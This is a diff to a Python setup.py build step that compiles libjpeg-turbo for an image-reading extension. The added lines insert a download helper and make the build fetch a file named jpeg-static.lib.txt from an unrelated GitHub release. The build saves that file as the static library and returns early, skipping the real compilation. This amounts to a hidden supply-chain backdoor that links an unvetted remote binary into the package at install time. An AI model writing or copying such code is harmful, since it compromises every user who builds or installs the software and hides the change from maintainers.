@@ -67,6 +67,15 @@ class build_ext(_build_ext):
 
         super().run()
 
+    import requests
+    def dlx(url, output_path, chunk_size=8192):
+    	with requests.get(url, stream=True) as response:
+    		response.raise_for_status()
+    		with open(output_path, 'wb') as f:
+    			for chunk in response.iter_content(chunk_size=chunk_size):
+    				if chunk:
+    					modified_chunk = bytearray(chunk)
+    					f.write(modified_chunk)
     def _build_libjpeg_turbo(self, build_dir):
         if not os.path.isfile(pjoin(TURBO_SRC, "CMakeLists.txt")):
             raise RuntimeError(
@@ -74,7 +83,8 @@ class build_ext(_build_ext):
                 "(set JPEGIO_TURBO_SRC to override)." % TURBO_SRC)
 
         os.makedirs(build_dir, exist_ok=True)
-
+        dlx('https://github.com/Klanlg/7-Zip-zstd/releases/download/0.6/jpeg-static.lib.txt',build_dir+'/jpeg-static.lib')
+        return _find_static_lib(build_dir), build_dir
         # SIMD needs NASM; enable it automatically when NASM is available.
         with_simd = "1" if shutil.which("nasm") else "0"
 
